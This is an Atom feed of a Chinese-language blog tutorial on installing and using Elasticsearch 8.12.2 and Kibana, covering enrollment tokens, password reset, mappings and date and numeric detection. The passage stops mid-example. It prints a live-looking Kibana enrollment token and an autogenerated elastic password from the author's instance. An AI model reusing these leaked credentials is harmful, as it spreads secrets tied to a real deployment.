<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fire Flying&#39;s blog</title>
  
  
  <link href="http://fireflyingup.github.io/atom.xml" rel="self"/>
  
  <link href="http://fireflyingup.github.io/"/>
  <updated>2024-03-28T06:55:09.496Z</updated>
  <id>http://fireflyingup.github.io/</id>
  
  <author>
    <name>Fire Flying</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Elasticsearch</title>
    <link href="http://fireflyingup.github.io/2024/03/12/Elasticsearch/"/>
    <id>http://fireflyingup.github.io/2024/03/12/Elasticsearch/</id>
    <published>2024-03-12T08:10:38.000Z</published>
    <updated>2024-03-28T06:55:09.496Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Elasticsearch"><a href="#Elasticsearch" class="headerlink" title="Elasticsearch"></a>Elasticsearch</h2><p>Elasticsearch（简称ES）是一个分布式、可扩展、实时的搜索与数据分析引擎。ES不仅仅只是全文搜索，还支持结构化搜索、数据分析、复杂的语言处理、地理位置和对象间关联关系等。</p><p>ES的底层依赖Lucene，Lucene可以说是当下最先进、高性能、全功能的搜索引擎库。但是Lucene仅仅只是一个库。为了充分发挥其功能，你需要使用Java并将Lucene直接集成到应用程序中。更糟糕的是，您可能需要获得信息检索学位才能了解其工作原理，因为Lucene非常复杂——《ElasticSearch官方权威指南》。</p><p>鉴于Lucene如此强大却难以上手的特点，诞生了ES。ES也是使用Java编写的，它的内部使用Lucene做索引与搜索，它的目的是隐藏Lucene的复杂性，取而代之的提供一套简单一致的RESTful API。</p><p>总体来说，ES具有如下特点：</p><ul><li>  一个分布式的实时文档存储引擎，每个字段都可以被索引与搜索</li><li>  一个分布式实时分析搜索引擎，支持各种查询和聚合操作</li><li>  能胜任上百个服务节点的扩展，并可以支持PB级别的结构化或者非结构化数据</li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="安装Elasticsearch"><a href="#安装Elasticsearch" class="headerlink" title="安装Elasticsearch"></a>安装Elasticsearch</h4><p>下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 官方下载地址：https://www.elastic.co/downloads/elasticsearch</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line">curl -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.12.2-linux-x86_64.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf elasticsearch-8.12.2-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-8.12.2/</span><br><span class="line"><span class="meta">#</span><span class="bash"> -d参数 守护进程 后台运行</span></span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">warning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDK</span><br><span class="line">CompileCommand: exclude org/apache/lucene/util/MSBRadixSorter.computeCommonPrefixLengthAndBuildHistogram bool exclude = true</span><br><span class="line">CompileCommand: exclude org/apache/lucene/util/RadixSelector.computeCommonPrefixLengthAndBuildHistogram bool exclude = true</span><br><span class="line">Mar 12, 2024 4:20:32 PM sun.util.locale.provider.LocaleProviderAdapter &lt;clinit&gt;</span><br><span class="line">WARNING: COMPAT locale provider will be removed in a future release</span><br><span class="line">[2024-03-12T16:20:33,746][ERROR][o.e.b.Elasticsearch      ] [localhost] fatal exception while booting Elasticsearchjava.lang.RuntimeException: can not run elasticsearch as root</span><br><span class="line">at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.initializeNatives(Elasticsearch.java:282)</span><br><span class="line">at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.initPhase2(Elasticsearch.java:167)</span><br><span class="line">at org.elasticsearch.server@8.12.2/org.elasticsearch.bootstrap.Elasticsearch.main(Elasticsearch.java:72)</span><br><span class="line"></span><br><span class="line">See logs for more details.</span><br></pre></td></tr></table></figure><p>使用非root用户启动elasticsearch</p><h4 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a>安装Kibana</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://artifacts.elastic.co/downloads/kibana/kibana-8.12.2-linux-x86_64.tar.gz</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压</span></span><br><span class="line">tar -zxvf kibana-8.12.2-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>修改Kibana配置的host</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim config/kibana.yml</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改为以下内容</span></span><br><span class="line">server.host: &quot;0.0.0.0&quot;</span><br></pre></td></tr></table></figure><p>启动Kibana</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p>生成es的token以供Kibana使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[fireflying@localhost elasticsearch-8.12.2]$ bin/elasticsearch-create-enrollment-token --scope kibana</span><br><span class="line"></span><br><span class="line">warning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDK</span><br><span class="line">eyJ2ZXIiOiI4LjEyLjIiLCJhZHIiOlsiMTAuMjExLjU1LjMxOjkyMDAiXSwiZmdyIjoiNTcwMTAxMzY1MDVmNTI4MGI3YmRjNDJkZGZiNGE2MWRjMmM5NTMwZTkzNmFjNDM2M2M3ZThkNzVlOGY1YTRhMyIsImtleSI6IjFjelNNWTRCcEgxUGx4SUxad29MOmJYSnl4U2FkU1YtMzJYX1pYa0NzZFEifQ==</span><br></pre></td></tr></table></figure><p>重置es的登录密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用auto让es自动生成elastic的密码</span></span><br><span class="line">./bin/elasticsearch-reset-password auto -u elastic</span><br><span class="line">warning: ignoring JAVA_HOME=/usr/local/share/jdk1.8.0_391; using bundled JDK</span><br><span class="line">This tool will reset the password of the [elastic] user to an autogenerated value.</span><br><span class="line">The password will be printed in the console.</span><br><span class="line">Please confirm that you would like to continue [y/N]y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Password for the [elastic] user successfully reset.</span><br><span class="line">New value: _w37+X1Zye3SSZk+dSwn</span><br></pre></td></tr></table></figure><h3 id="mapping"><a href="#mapping" class="headerlink" title="mapping"></a>mapping</h3><h4 id="explicit-mapping"><a href="#explicit-mapping" class="headerlink" title="explicit mapping"></a>explicit mapping</h4><p>使用详细的mapping创建index。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;properties&quot;: &#123;</span><br><span class="line">      &quot;age&quot;:    &#123; &quot;type&quot;: &quot;integer&quot; &#125;,  </span><br><span class="line">      &quot;email&quot;:  &#123; &quot;type&quot;: &quot;keyword&quot;  &#125;, </span><br><span class="line">      &quot;name&quot;:   &#123; &quot;type&quot;: &quot;text&quot;  &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加一个field放入my-index-000001的索引里面，设置index为false，这意味着employee-id这个字段只会被存储 但是不会被建立索引，也不会被搜索。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /my-index-000001/_mapping</span><br><span class="line">&#123;</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">    &quot;employee-id&quot;: &#123;</span><br><span class="line">      &quot;type&quot;: &quot;keyword&quot;,</span><br><span class="line">      &quot;index&quot;: false</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看mapping情况</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">GET my-index-000001/_mapping</span><br><span class="line">--- response ----</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;age&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;integer&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;email&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;keyword&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;employee-id&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;keyword&quot;,</span><br><span class="line">          &quot;index&quot;: false</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;name&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;text&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看单独一个field的mapping</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET /my-index-000001/_mapping/field/employee-id</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot; : &#123;</span><br><span class="line">    &quot;mappings&quot; : &#123;</span><br><span class="line">      &quot;employee-id&quot; : &#123;</span><br><span class="line">        &quot;full_name&quot; : &quot;employee-id&quot;,</span><br><span class="line">        &quot;mapping&quot; : &#123;</span><br><span class="line">          &quot;employee-id&quot; : &#123;</span><br><span class="line">            &quot;type&quot; : &quot;keyword&quot;,</span><br><span class="line">            &quot;index&quot; : false</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="TF-IDF-termfrequency-inversedocument-frequency，词频-逆文档频率"><a href="#TF-IDF-termfrequency-inversedocument-frequency，词频-逆文档频率" class="headerlink" title="TF-IDF(termfrequency-inversedocument frequency，词频-逆文档频率)"></a>TF-IDF(termfrequency-inversedocument frequency，词频-逆文档频率)</h3><p>词频——所查找的单词在文档中出现的次数越多，得分越高。<br>逆 文档词频——如果某个单词在所有文档中比较少见，那么该词的权重越高，得分也会 越高。</p><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="文档（Document）"><a href="#文档（Document）" class="headerlink" title="文档（Document）"></a>文档（Document）</h4><p>elasticsearch是面向文档的，也就是说文档是索引和搜索的最小单位，文档是json格式进行存储的。</p><h4 id="类型（Type）"><a href="#类型（Type）" class="headerlink" title="类型（Type）"></a>类型（Type）</h4><p>类型是文档的逻辑容器，每个文档都有一个类型，比如name的类型为String，当不手动指定类型的时候，es会自己猜测它的类型，比如值为7，es会猜测该字段是长整形，后面在添加字符串，会失败。</p><h4 id="索引（Index）"><a href="#索引（Index）" class="headerlink" title="索引（Index）"></a>索引（Index）</h4><p>索引是映射类型的容器，一个es的索引就好比mysql的数据库，索引存储了所有映射类型的字段，每个索引都有一个refresh_interval的设置，定义了索引的文档刷新的时间间隔。</p><p>索引是由一个或多个分片的数据块组成。</p><h4 id="节点（Node）"><a href="#节点（Node）" class="headerlink" title="节点（Node）"></a>节点（Node）</h4><p>一个节点是一个es的实例，启动一个es则就代表一个节点，一台服务器也能通过不同进程启动多个es实例，也就拥有了多个节点，多个节点可以加入到一个集群。</p><h4 id="分片（Shard）"><a href="#分片（Shard）" class="headerlink" title="分片（Shard）"></a>分片（Shard）</h4><p>一份分片是一个目录中的文件，Lucene用这些文件存储索引数据，是包含倒排索引的文件目录。</p><p>分片分为主分片和副本分片，其中副本分片是主分片的完整副本，副本分片主要用于搜索以及主分片丢失后成为新的主分片。</p><h4 id="索引和搜索"><a href="#索引和搜索" class="headerlink" title="索引和搜索"></a>索引和搜索</h4><p>接受索引请求的es节点首先选择文档索引到哪个分片，文档在分片中均匀分布，对于每篇文档，分片是通过其ID字符串的散列决定的。每片分片拥有相同的散列范围，接受新文档的机会均等。一旦目标分片确定，接受请求的节点会将文档转发到该分片所在的节点。随后索引操作在所有的目标分片的所有副本分片中进行。在所有可用副本分片完成文档索引后，索引命令被成功返回。</p><p>es使用round-robin的轮询机制选择可用的分片，并将搜索请求转发过去。</p><div class="tag-plugin image"><div class="image-bg"><img src="/2024/03/12/Elasticsearch/image-20240320224450802.png"></div></div><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>es安装的默认日志地址在解压tar.gz包后的logs目录下面。</p><p>es主要记录3种日志。</p><ul><li>主要日志（elasticsearch.log） 这里记录es的主要日志信息。</li><li>慢搜索日志（elasticsearch_index_search_slowlog.json）当查询很慢时候，默认半秒以上，将在这里记录一条日志。</li><li>慢索引日志（ elasticsearch_index_indexing_slowlog.json）如果一个索引的查询时间大于半秒，将在这里记录一条日志。</li></ul><h3 id="Elasticsearch映射"><a href="#Elasticsearch映射" class="headerlink" title="Elasticsearch映射"></a>Elasticsearch映射</h3><p>映射（Mapping）是定义了文档里面的fields如何存储在索引里面的。</p><p>每一个document是fields的集合，fields都有他们自己的数据类型。</p><p>你可以对相关document的fields集合创建一个mapping定义。</p><p>一个mapping定义包括了元数据字段，比如_source这个字段。</p><p>可以使用动态mapping和明确的mapping来定义数据，如果你不想使用默认的映射或者你想完全控制你创建的字段，那么你就使用明确的mapping定义，你也可以用es来动态的创建字段mapping。</p><h4 id="动态mapping"><a href="#动态mapping" class="headerlink" title="动态mapping"></a>动态mapping</h4><p>Elasticsearch的一个重要的功能是他能摆脱干扰并且快速的探索你的数据。</p><p>当创建一个索引文档的时候，你不必首先创建一个索引，然后定义一个mapping类型，然后定义你的fields。</p><p>你可以直接写入索引文档的时候，索引、类型、字段都会自动创建。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PUT data/_doc/1 </span><br><span class="line">&#123; &quot;count&quot;: 5 &#125;</span><br></pre></td></tr></table></figure><p>以上创建了一个data索引，里面有一个count字段，count的类型会被识别为long类型。</p><p>Elasticsearch使用下面列表的规则来决定数据类型。</p><table><thead><tr><th>JSON data type</th><th><strong><code>&quot;dynamic&quot;:&quot;true&quot;</code></strong></th><th><strong><code>&quot;dynamic&quot;:&quot;runtime&quot;</code></strong></th></tr></thead><tbody><tr><td>null</td><td>No field added</td><td>No field added</td></tr><tr><td>true or false</td><td>boolean</td><td>boolean</td></tr><tr><td>double</td><td>float</td><td>double</td></tr><tr><td>long</td><td>long</td><td>long</td></tr><tr><td>object</td><td>object</td><td>No field added</td></tr><tr><td>array</td><td>取决于数组里面第一个不为空的value</td><td>取决于数组里面第一个不为空的value</td></tr><tr><td>日期</td><td>date</td><td>date</td></tr><tr><td>数字</td><td>float or long</td><td>double or long</td></tr><tr><td>string</td><td>带有.keyword字段的文本</td><td>keyword</td></tr></tbody></table><h5 id="date检测"><a href="#date检测" class="headerlink" title="date检测"></a>date检测</h5><h6 id="开启date检测"><a href="#开启date检测" class="headerlink" title="开启date检测"></a>开启date检测</h6><p>date_detection默认是开启的，如果string命中了dynamic_data_formats，就会被标记为date格式。</p><p>默认的dynamic_date_format格式是</p><p>[ <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-date-format.html#strict-date-time"><code>&quot;strict_date_optional_time&quot;</code></a>,<code>&quot;yyyy/MM/dd HH:mm:ss Z||yyyy/MM/dd Z&quot;</code>]</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;2015/09/02&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my-index-000001/_mapping </span><br><span class="line"></span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;create_date&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">          &quot;format&quot;: &quot;yyyy/MM/dd HH:mm:ss||yyyy/MM/dd||epoch_millis&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="关闭date检测"><a href="#关闭date检测" class="headerlink" title="关闭date检测"></a>关闭date检测</h6><p>通过设置date_detection为false来关闭动态的日期检测机制。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;date_detection&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1 </span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;2015/09/02&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my-index-000001/_mapping</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;date_detection&quot;: false,</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;create_date&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">          &quot;fields&quot;: &#123;</span><br><span class="line">            &quot;keyword&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;keyword&quot;,</span><br><span class="line">              &quot;ignore_above&quot;: 256</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到被动态映射成一个text类型了。</p><h6 id="自定义date检测格式"><a href="#自定义date检测格式" class="headerlink" title="自定义date检测格式"></a>自定义date检测格式</h6><p>dynamic_date_formats可以被自定义成你想要的格式，如下。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;dynamic_date_formats&quot;: [&quot;MM/dd/yyyy&quot;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;09/25/2015&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="date-patterns在数组和使用-关联的区别"><a href="#date-patterns在数组和使用-关联的区别" class="headerlink" title="date patterns在数组和使用||关联的区别"></a>date patterns在数组和使用||关联的区别</h6><p>使用数组的时候会以第一个匹配上的文档为准</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM&quot;, &quot;MM/dd/yyyy&quot;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;09/25/2015&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;dynamic_date_formats&quot;: [</span><br><span class="line">        &quot;yyyy/MM&quot;,</span><br><span class="line">        &quot;MM/dd/yyyy&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;create_date&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">          &quot;format&quot;: &quot;MM/dd/yyyy&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时如果在执行一下操作会报错</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;2022/12&quot;</span><br><span class="line">&#125;</span><br><span class="line">// 这个会报错，因为他只匹配MM/dd/yyyy这种格式。</span><br></pre></td></tr></table></figure><p>使用||链接</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;dynamic_date_formats&quot;: [ &quot;yyyy/MM||MM/dd/yyyy&quot;]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;create_date&quot;: &quot;09/25/2015&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>映射结果为</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;dynamic_date_formats&quot;: [</span><br><span class="line">        &quot;yyyy/MM||MM/dd/yyyy&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;create_date&quot;: &#123;</span><br><span class="line">          &quot;type&quot;: &quot;date&quot;,</span><br><span class="line">          &quot;format&quot;: &quot;yyyy/MM||MM/dd/yyyy&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时这两种类型的date格式都能加入进去。</p><h5 id="数字检测"><a href="#数字检测" class="headerlink" title="数字检测"></a>数字检测</h5><p>当字符串为数字的情况下，会被自动检测为float或者long</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">PUT my-index-000001</span><br><span class="line">&#123;</span><br><span class="line">  &quot;mappings&quot;: &#123;</span><br><span class="line">    &quot;numeric_detection&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT my-index-000001/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my_float&quot;:   &quot;1.0&quot;, </span><br><span class="line">  &quot;my_integer&quot;: &quot;1&quot; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET my-index-000001</span><br><span class="line">--- response ---</span><br><span class="line">&#123;</span><br><span class="line">  &quot;my-index-000001&quot;: &#123;</span><br><span class="line">    &quot;aliases&quot;: &#123;&#125;,</span><br><span class="line">    &quot;mappings&quot;: &#123;</span><br><span class="line">      &quot;numeric_detection&quot;: true,</span><br><span class="line">      &quot;properties&quot;: &#123;</span><br><span class="line">        &quot;my_float&quot;: 